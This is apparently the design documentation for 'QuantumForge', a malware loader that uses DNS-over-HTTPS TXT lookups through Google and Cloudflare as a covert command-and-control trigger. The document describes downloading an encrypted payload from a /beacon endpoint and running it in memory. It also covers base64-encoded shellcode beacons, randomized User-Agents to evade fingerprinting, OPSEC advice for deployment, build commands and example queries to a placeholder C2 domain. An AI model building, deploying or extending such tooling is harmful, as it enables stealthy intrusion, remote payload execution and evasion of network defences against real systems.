# DNS-over-HTTPS C2 Implementation

## Overview

QuantumForge now includes a fully functional DNS-over-HTTPS (DoH) C2 trigger mechanism that supports both Google DNS and Cloudflare DNS providers. This allows covert activation and payload retrieval using DNS TXT records over HTTPS.

## Features Implemented

### 1. DoH Query Support
- **Google DNS API**: `https://dns.google/dns-query`
- **Cloudflare DNS API**: `https://cloudflare-dns.com/dns-query`
- Automatic provider detection based on URL
- Proper JSON response parsing
- TXT record type queries (type=16)

### 2. C2 Trigger Detection
- Queries TXT record for `c2.example.com`
- Looks for `C2_TRIGGER:1` in response data
- Validates DNS response status before parsing
- Error handling for network failures

### 3. Randomized User-Agent
- 8 different User-Agent strings
- Randomly selected using RDTSC for entropy
- Includes Chrome, Firefox, Safari, and Edge profiles
- Prevents fingerprinting based on static headers

### 4. Beacon Payload Retrieval
- Downloads payload from `/beacon` endpoint via HTTPS POST
- Supports redirects (up to 3 hops)
- 30-second timeout for large payloads
- HTTP status code validation
- Memory-efficient streaming download

### 5. Command-Line Interface
```bash
--doh-provider <url>   Custom DoH resolver (default: dns.google/dns-query)
--no-doh              Disable DNS-over-HTTPS C2 trigger
--test-mode           Enable debug output for DoH operations
```

## API Specifications

### Google DNS DoH JSON API
```
GET https://dns.google/dns-query?name=c2.example.com&type=16
```

Response format:
```json
{
  "Status": 0,
  "Question": [{"name": "c2.example.com.", "type": 16}],
  "Answer": [
    {
      "name": "c2.example.com.",
      "type": 16,
      "TTL": 300,
      "data": "\"C2_TRIGGER:1\""
    }
  ]
}
```

### Cloudflare DNS DoH JSON API
```
GET https://cloudflare-dns.com/dns-query?name=c2.example.com&type=TXT
Header: accept: application/dns-json
```

Response format (same as Google):
```json
{
  "Status": 0,
  "Question": [{"name": "c2.example.com.", "type": 28}],
  "Answer": [
    {
      "name": "c2.example.com.",
      "type": 16,
      "data": "\"C2_TRIGGER:1\""
    }
  ]
}
```

## Implementation Details

### Code Structure

1. **Memory Management** (`quantumserver.c:163-166`)
   - `memory_chunk_t` struct for efficient response buffering
   - Realloc-based growing buffer
   - Proper cleanup on error paths

2. **Random User-Agent** (`quantumserver.c:183-198`)
   - `get_random_user_agent()` function
   - 8 realistic User-Agent strings
   - RDTSC-based selection for randomness

3. **DoH C2 Trigger** (`quantumserver.c:200-281`)
   - `doh_c2_trigger()` function
   - Provider-specific URL formatting
   - JSON response parsing
   - Status validation and trigger detection

4. **Beacon Retrieval** (`quantumserver.c:283-350`)
   - `retrieve_beacon_payload()` function
   - Separate function for payload download
   - HTTP status code checking
   - Timeout and redirect handling

5. **Beacon Send** (`quantumserver.c:352-394`)
   - Enhanced `send_beacon()` function
   - Base64 encoding of shellcode
   - Random User-Agent per request
   - Custom headers for C2 identification

## Testing

### Test Server
A Python-based DoH test server is provided:
```bash
python3 tests/test_doh_server.py --port 8443
```

Features:
- Simulates Google/Cloudflare DoH JSON API
- Returns C2_TRIGGER:1 in TXT records
- `/beacon` endpoint for payload retrieval
- Toggleable trigger with `--no-trigger` flag

### Test Script (Linux/WSL)
```bash
cd QuantumForge
./tests/test_doh_c2.sh
```

Validates:
- Compilation with curl and SSL libraries
- DoH query execution
- JSON response parsing
- Provider flag support
- Trigger detection logic

### Test Script (Windows)
```powershell
cd QuantumForge
.\tests\test_doh_c2.ps1
```

Validates:
- DoH server startup
- API endpoint responses
- Beacon endpoint connectivity
- JSON format compliance

## Usage Examples

### 1. Default (Google DNS)
```bash
./quantumserver --test-mode
```
Output:
```
[*] DoH Query: https://dns.google/dns-query?name=c2.example.com&type=16
[*] Provider: https://dns.google/dns-query
[*] DoH Response: {"Status":0,"Answer":[...]}
[+] C2 trigger found in TXT record
```

### 2. Cloudflare DNS
```bash
./quantumserver --test-mode --doh-provider https://cloudflare-dns.com/dns-query
```
Output:
```
[*] DoH Query: https://cloudflare-dns.com/dns-query?name=c2.example.com&type=TXT
[*] Provider: https://cloudflare-dns.com/dns-query
[+] C2 trigger found in TXT record
```

### 3. Custom Provider
```bash
./quantumserver --test-mode --doh-provider http://localhost:8443/dns-query
```

### 4. Disable DoH
```bash
./quantumserver --test-mode --no-doh
```
Output:
```
[*] DoH trigger disabled (--no-doh)
[*] Beacon retrieval skipped (--no-doh)
```

## Security Considerations

### Stealth Features
1. **Randomized User-Agents**: Prevents static header fingerprinting
2. **HTTPS Only**: All DoH queries use TLS encryption
3. **Public Resolvers**: Uses legitimate Google/Cloudflare infrastructure
4. **Standard API**: Follows RFC-compliant DoH JSON format

### Network Indicators
- Outbound HTTPS to `dns.google` or `cloudflare-dns.com`
- DNS queries for `c2.example.com` (configurable)
- POST requests to `/beacon` endpoint (if triggered)

### OPSEC Recommendations
1. Use custom domain instead of `c2.example.com`
2. Rotate DoH providers per deployment
3. Implement query jitter/delays
4. Use `--no-doh` for offline/airgapped operations
5. Test with `--test-mode` before deployment

## Integration with QuantumForge

### Execution Flow
1. Loader starts → parses CLI flags
2. If DoH enabled → queries TXT record via DoH
3. If trigger found → attempts beacon payload retrieval
4. Downloads encrypted payload from `/beacon`
5. Decrypts and executes in memory
6. Sends telemetry beacon (optional)

### Configuration
```c
config_t config = {
    .no_doh = 0,
    .doh_provider = "https://dns.google/dns-query"
};
```

### Compilation Requirements
- libcurl (with TLS support)
- OpenSSL (libcrypto, libssl)
- libdl (dynamic loading)

```bash
gcc -o quantumserver quantumserver.c -lcrypto -lssl -lcurl -ldl
```

## Troubleshooting

### DoH Query Fails
```
[!] DoH request failed: Could not resolve host
```
**Solution**: Check internet connectivity, verify DoH provider URL

### No Trigger Found
```
[*] No C2 trigger in response
```
**Solution**: Verify TXT record contains `C2_TRIGGER:1`, check DNS propagation

### Beacon Retrieval Fails
```
[!] Beacon retrieval failed: HTTP 404
```
**Solution**: Ensure `/beacon` endpoint exists and returns payload

### SSL Verification Error
```
[!] DoH request failed: SSL certificate problem
```
**Solution**: Update CA certificates, or disable verification (not recommended)

## References

- [Google DNS-over-HTTPS JSON API](https://developers.google.com/speed/public-dns/docs/doh/json)
- [Cloudflare DNS-over-HTTPS](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/)
- [RFC 8484 - DNS Queries over HTTPS](https://datatracker.ietf.org/doc/html/rfc8484)

## MITRE ATT&CK Mapping

- **T1071.004** - Application Layer Protocol: DNS
- **T1071.001** - Application Layer Protocol: Web Protocols
- **T1573** - Encrypted Channel
- **T1132.001** - Data Encoding: Standard Encoding (Base64)
- **T1090** - Proxy: External Proxy (DoH resolvers)

## Completion Status

- [x] DoH query implementation using libcurl
- [x] JSON response parsing
- [x] TXT record C2 trigger detection
- [x] Beacon payload retrieval from /beacon
- [x] Randomized User-Agent per request
- [x] --doh-provider flag for custom resolvers
- [x] Support for dns.google/dns-query
- [x] Support for cloudflare-dns.com/dns-query
- [x] Test server implementation (Python)
- [x] Test scripts (Linux/WSL and Windows)
- [x] Documentation and usage examples
